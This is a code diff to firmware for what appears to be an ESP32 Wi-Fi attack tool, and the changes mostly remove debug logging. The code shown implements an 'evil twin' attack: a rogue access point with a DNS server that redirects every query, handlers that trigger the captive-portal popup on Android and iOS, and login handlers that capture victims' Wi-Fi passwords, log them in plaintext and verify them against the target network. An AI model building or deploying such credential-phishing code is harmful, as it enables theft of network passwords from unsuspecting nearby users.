@@ -732,8 +732,6 @@ static void wifi_event_handler(void *event_handler_arg,
                 
                 // Stop DNS server task
                 if (dns_server_task_handle != NULL) {
-                    MY_LOG_INFO(TAG, "Stopping DNS server task...");
-                    
                     // Wait for DNS task to finish (it checks portal_active flag)
                     for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                         vTaskDelay(pdMS_TO_TICKS(100));
@@ -747,9 +745,6 @@ static void wifi_event_handler(void *event_handler_arg,
                             close(dns_server_socket);
                             dns_server_socket = -1;
                         }
-                        MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
-                    } else {
-                        MY_LOG_INFO(TAG, "DNS server task stopped.");
                     }
                 }
                 
@@ -763,12 +758,7 @@ static void wifi_event_handler(void *event_handler_arg,
                 // Stop DHCP server
                 esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
                 if (ap_netif) {
-                    esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
-                    if (dhcp_ret != ESP_OK) {
-                        MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
-                    } else {
-                        MY_LOG_INFO(TAG, "DHCP server stopped.");
-                    }
+                    esp_netif_dhcps_stop(ap_netif);
                 }
                 
                 // Change WiFi mode from APSTA to STA only (disable AP)
@@ -813,95 +803,18 @@ static void wifi_event_handler(void *event_handler_arg,
                 esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
             }
             
-            // Log DHCP lease information if available
-            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-            if (ap_netif) {
-                esp_netif_ip_info_t ip_info;
-                esp_netif_get_ip_info(ap_netif, &ip_info);
-                MY_LOG_INFO(TAG, "AP IP: %lu.%lu.%lu.%lu", 
-                           ip_info.ip.addr & 0xFF,
-                           (ip_info.ip.addr >> 8) & 0xFF,
-                           (ip_info.ip.addr >> 16) & 0xFF,
-                           (ip_info.ip.addr >> 24) & 0xFF);
-                MY_LOG_INFO(TAG, "AP Gateway: %lu.%lu.%lu.%lu", 
-                           ip_info.gw.addr & 0xFF,
-                           (ip_info.gw.addr >> 8) & 0xFF,
-                           (ip_info.gw.addr >> 16) & 0xFF,
-                           (ip_info.gw.addr >> 24) & 0xFF);
-                MY_LOG_INFO(TAG, "AP Netmask: %lu.%lu.%lu.%lu", 
-                           ip_info.netmask.addr & 0xFF,
-                           (ip_info.netmask.addr >> 8) & 0xFF,
-                           (ip_info.netmask.addr >> 16) & 0xFF,
-                           (ip_info.netmask.addr >> 24) & 0xFF);
-                
-                // Wait a bit for DHCP to assign IP
-                vTaskDelay(pdMS_TO_TICKS(3000));
-                MY_LOG_INFO(TAG, "Waiting for client to make HTTP requests...");
-                
-                // Check if client got an IP address by checking DHCP lease
-                MY_LOG_INFO(TAG, "Checking if client received IP address...");
-                MY_LOG_INFO(TAG, "Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
-                           e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
-                
-                // Check if client got an IP address by trying to ping
-                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
-                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
-                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
-                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
-                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
-                
-                // DHCP server should be running
-                MY_LOG_INFO(TAG, "DHCP server should be running and assigning IP addresses");
-                
-                // Log DHCP server configuration
-                MY_LOG_INFO(TAG, "DHCP server is configured to assign IPs in range 172.0.0.2-172.0.0.254");
-                MY_LOG_INFO(TAG, "DNS server will redirect all queries to 172.0.0.1");
-                
-                // Check if client got an IP address by trying to ping
-                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
-                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
-                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
-                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
-                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
-                
-                // Check if client got an IP address
-                esp_netif_ip_info_t client_ip_info;
-                if (esp_netif_get_ip_info(ap_netif, &client_ip_info) == ESP_OK) {
-                    MY_LOG_INFO(TAG, "AP IP in hex: 0x%08lX", client_ip_info.ip.addr);
-                    
-                    // Calculate correct IP range for DHCP clients
-                    // ESP-IDF stores IP in little-endian format
-                    uint32_t base_ip = client_ip_info.ip.addr;
-                    uint32_t first_client_ip = (base_ip & 0x00FFFFFF) | 0x02000000;  // 172.0.0.2
-                    uint32_t last_client_ip = (base_ip & 0x00FFFFFF) | 0xFE000000;   // 172.0.0.254
-                    
-                    MY_LOG_INFO(TAG, "First client IP in hex: 0x%08lX", first_client_ip);
-                    MY_LOG_INFO(TAG, "Last client IP in hex: 0x%08lX", last_client_ip);
-                    
-                    MY_LOG_INFO(TAG, "DHCP client IP range: %lu.%lu.%lu.%lu - %lu.%lu.%lu.%lu", 
-                               first_client_ip & 0xFF,
-                               (first_client_ip >> 8) & 0xFF,
-                               (first_client_ip >> 16) & 0xFF,
-                               (first_client_ip >> 24) & 0xFF,
-                               last_client_ip & 0xFF,
-                               (last_client_ip >> 8) & 0xFF,
-                               (last_client_ip >> 16) & 0xFF,
-                               (last_client_ip >> 24) & 0xFF);
-                }
-            }
+            // Wait a bit for DHCP to assign IP
+            vTaskDelay(pdMS_TO_TICKS(3000));
             break;
         }
         case WIFI_EVENT_AP_STADISCONNECTED: {
             const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
-            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
-                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+            // Client disconnected
             
             // Decrement connected clients counter
             if (portal_connected_clients > 0) {
                 portal_connected_clients--;
-            }
-            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
-            
+            }            
             // If last client disconnected during evil twin attack, resume channel hopping
             if (portal_connected_clients == 0 && 
                 (applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK)) {
@@ -2295,9 +2208,8 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
             ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
             
-            esp_err_t             ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
             if (ret != ESP_OK) {
-                MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
                 applicationState = IDLE;
                 return 1;
             }
@@ -2343,7 +2255,6 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             // Start DHCP server
             ret = esp_netif_dhcps_start(ap_netif);
             if (ret != ESP_OK) {
-                MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
                 applicationState = IDLE;
                 return 1;
             }
@@ -2675,8 +2586,6 @@ static int cmd_stop(int argc, char **argv) {
         
         // Stop DNS server task
         if (dns_server_task_handle != NULL) {
-            MY_LOG_INFO(TAG, "Stopping DNS server task...");
-            
             // Wait for DNS task to finish (it checks portal_active flag)
             for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                 vTaskDelay(pdMS_TO_TICKS(100));
@@ -2690,9 +2599,6 @@ static int cmd_stop(int argc, char **argv) {
                     close(dns_server_socket);
                     dns_server_socket = -1;
                 }
-                MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
-            } else {
-                MY_LOG_INFO(TAG, "DNS server task stopped.");
             }
         }
         
@@ -2706,12 +2612,7 @@ static int cmd_stop(int argc, char **argv) {
         // Stop DHCP server
         esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
         if (ap_netif) {
-            esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
-            if (dhcp_ret != ESP_OK) {
-                MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
-            } else {
-                MY_LOG_INFO(TAG, "DHCP server stopped.");
-            }
+            esp_netif_dhcps_stop(ap_netif);
         }
         
         // Stop AP mode
@@ -4097,13 +3998,9 @@ static const char* default_portal_html =
 
 // HTTP handler for login form
 static esp_err_t login_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Login handler called - URI: %s, Method: %s", req->uri, req->method == HTTP_POST ? "POST" : "GET");
-    MY_LOG_INFO(TAG, "Login handler called - processing password!");
-    
     char buf[256];
     int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
     if (ret <= 0) {
-        MY_LOG_INFO(TAG, "Failed to receive POST data");
         return ESP_FAIL;
     }
     buf[ret] = '\0';
@@ -4203,15 +4100,12 @@ static esp_err_t login_handler(httpd_req_t *req) {
 
 // HTTP handler for GET /get endpoint
 static esp_err_t get_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "GET handler called - URI: %s", req->uri);
-    
     // Get query string
     size_t query_len = httpd_req_get_url_query_len(req);
     if (query_len > 0) {
         char *query_string = malloc(query_len + 1);
         if (query_string) {
             if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
-                MY_LOG_INFO(TAG, "Received GET query: %s", query_string);
                 
                 // Parse password from query string
                 char password_param[64];
@@ -4232,8 +4126,7 @@ static esp_err_t get_handler(httpd_req_t *req) {
                     }
                     decoded_password[decoded_len] = '\0';
                     
-                    // Log the password
-                    MY_LOG_INFO(TAG, "Portal password received (GET): %s", decoded_password);
+                    MY_LOG_INFO(TAG, "Password: %s", decoded_password);
                     
                     // If in evil twin mode, verify the password (save will happen after verification)
                     if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
@@ -4303,17 +4196,12 @@ static esp_err_t get_handler(httpd_req_t *req) {
 
 // HTTP handler for POST /save endpoint
 static esp_err_t save_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Save handler called - URI: %s", req->uri);
-    
     char buf[256];
     int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
     if (ret <= 0) {
-        MY_LOG_INFO(TAG, "Failed to receive POST data");
         return ESP_FAIL;
     }
     buf[ret] = '\0';
-    
-    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
     
     // Parse password from POST data
     char *password_start = strstr(buf, "password=");
@@ -4340,8 +4228,7 @@ static esp_err_t save_handler(httpd_req_t *req) {
         }
         decoded_password[decoded_len] = '\0';
         
-        // Log the password
-        MY_LOG_INFO(TAG, "Portal password received (SAVE): %s", decoded_password);
+        MY_LOG_INFO(TAG, "Password: %s", decoded_password);
         
         // If in evil twin mode, verify the password (save will happen after verification)
         if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
@@ -4406,8 +4293,6 @@ static esp_err_t save_handler(httpd_req_t *req) {
 
 // HTTP handler for portal page
 static esp_err_t portal_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Portal page accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
-    MY_LOG_INFO(TAG, "Portal handler called - serving portal page!");
     httpd_resp_set_type(req, "text/html");
     const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
@@ -4416,12 +4301,6 @@ static esp_err_t portal_handler(httpd_req_t *req) {
 
 // URI handler for captive portal redirection
 static esp_err_t captive_portal_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Captive portal redirect triggered for: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
-    MY_LOG_INFO(TAG, "Catch-all handler called - redirecting to portal!");
-    
-    // Log client IP (simplified - just log that we received a request)
-    MY_LOG_INFO(TAG, "HTTP request received from client");
-    
     // Redirect all requests to our portal page
     httpd_resp_set_status(req, "302 Found");
     httpd_resp_set_hdr(req, "Location", "/portal");
@@ -4431,11 +4310,6 @@ static esp_err_t captive_portal_handler(httpd_req_t *req) {
 
 // Handler for root path - most devices try to access this first
 static esp_err_t root_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Root path accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
-    
-    // Log client IP (simplified - just log that we received a request)
-    MY_LOG_INFO(TAG, "HTTP request received from client");
-    
     // Add captive portal headers for Android/Samsung detection
     httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
     httpd_resp_set_hdr(req, "Pragma", "no-cache");
@@ -4452,9 +4326,6 @@ static esp_err_t root_handler(httpd_req_t *req) {
 
 // Handler for Android captive portal detection (generate_204)
 static esp_err_t android_captive_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Android captive portal detection: %s", req->uri);
-    MY_LOG_INFO(TAG, "Android handler called - this means client is trying to detect captive portal!");
-    
     // Android expects a 204 No Content response for captive portal detection
     // If we return 204, Android thinks internet works
     // If we return 200 with HTML, Android thinks it's a captive portal
@@ -4473,9 +4344,6 @@ static esp_err_t android_captive_handler(httpd_req_t *req) {
 
 // Handler for iOS captive portal detection (hotspot-detect.html)
 static esp_err_t ios_captive_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "iOS captive portal detection: %s", req->uri);
-    MY_LOG_INFO(TAG, "iOS handler called - this means client is trying to detect captive portal!");
-    
     // iOS detects captive portal when this endpoint returns something other than "Success"
     // So we return our portal HTML with password form to trigger captive portal popup
     httpd_resp_set_status(req, "200 OK");
@@ -4492,8 +4360,6 @@ static esp_err_t ios_captive_handler(httpd_req_t *req) {
 
 // Handler for common captive portal detection endpoints
 static esp_err_t captive_detection_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "Captive portal detection endpoint accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
-    
     // Add captive portal headers
     httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
     httpd_resp_set_hdr(req, "Pragma", "no-cache");
@@ -4509,8 +4375,6 @@ static esp_err_t captive_detection_handler(httpd_req_t *req) {
 
 // RFC 8908 Captive Portal API endpoint
 static esp_err_t captive_api_handler(httpd_req_t *req) {
-    MY_LOG_INFO(TAG, "RFC 8908 Captive Portal API handler called - URI: %s", req->uri);
-    
     // Set CORS headers
     httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
     httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
@@ -4540,7 +4404,6 @@ static esp_err_t captive_api_handler(httpd_req_t *req) {
     httpd_resp_set_type(req, "application/json");
     httpd_resp_send(req, json_response, strlen(json_response));
     
-    MY_LOG_INFO(TAG, "RFC 8908 API response sent: %s", json_response);
     return ESP_OK;
 }
 
@@ -4557,7 +4420,6 @@ static void dns_server_task(void *pvParameters) {
     // Create UDP socket
     dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (dns_server_socket < 0) {
-        MY_LOG_INFO(TAG, "Failed to create DNS socket: %d", errno);
         dns_server_task_handle = NULL;
         vTaskDelete(NULL);
         return;
@@ -4571,7 +4433,6 @@ static void dns_server_task(void *pvParameters) {
     
     int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
     if (err < 0) {
-        MY_LOG_INFO(TAG, "Failed to bind DNS socket: %d", errno);
         close(dns_server_socket);
         dns_server_socket = -1;
         dns_server_task_handle = NULL;
@@ -4595,7 +4456,6 @@ static void dns_server_task(void *pvParameters) {
                 // Timeout, check portal_active flag and continue
                 continue;
             }
-            MY_LOG_INFO(TAG, "DNS recvfrom error: %d", errno);
             break;
         }
         
@@ -4679,7 +4539,6 @@ static void dns_server_task(void *pvParameters) {
     }
     
     // Clean up
-    MY_LOG_INFO(TAG, "DNS server task stopping...");
     close(dns_server_socket);
     dns_server_socket = -1;
     dns_server_task_handle = NULL;
@@ -4739,7 +4598,6 @@ static int cmd_start_portal(int argc, char **argv) {
     
     esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
     if (ret != ESP_OK) {
-        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
         return 1;
     }
     
@@ -4776,12 +4634,9 @@ static int cmd_start_portal(int argc, char **argv) {
     // Start DHCP server
     ret = esp_netif_dhcps_start(ap_netif);
     if (ret != ESP_OK) {
-        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
         esp_wifi_stop();
         return 1;
     }
-    
-    MY_LOG_INFO(TAG, "DHCP server started - clients will get IPs in 172.0.0.x range");
     
     // Wait a bit for AP to fully start
     vTaskDelay(pdMS_TO_TICKS(1000));
@@ -4934,7 +4789,6 @@ static int cmd_start_portal(int argc, char **argv) {
     );
     
     if (task_ret != pdPASS) {
-        MY_LOG_INFO(TAG, "Failed to create DNS server task");
         portal_active = false;
         httpd_stop(portal_server);
         portal_server = NULL;
@@ -4942,14 +4796,9 @@ static int cmd_start_portal(int argc, char **argv) {
         return 1;
     }
     
-    MY_LOG_INFO(TAG, "DNS server task started");
-    
     MY_LOG_INFO(TAG, "Captive portal started successfully!");
     MY_LOG_INFO(TAG, "AP Name: %s", ssid);
-    MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
     MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);
-    MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
-    MY_LOG_INFO(TAG, "HTTP server running on port 80");
 
     esp_err_t led_err = led_set_color(255, 0, 255); // Purple for portal mode
     if (led_err != ESP_OK) {
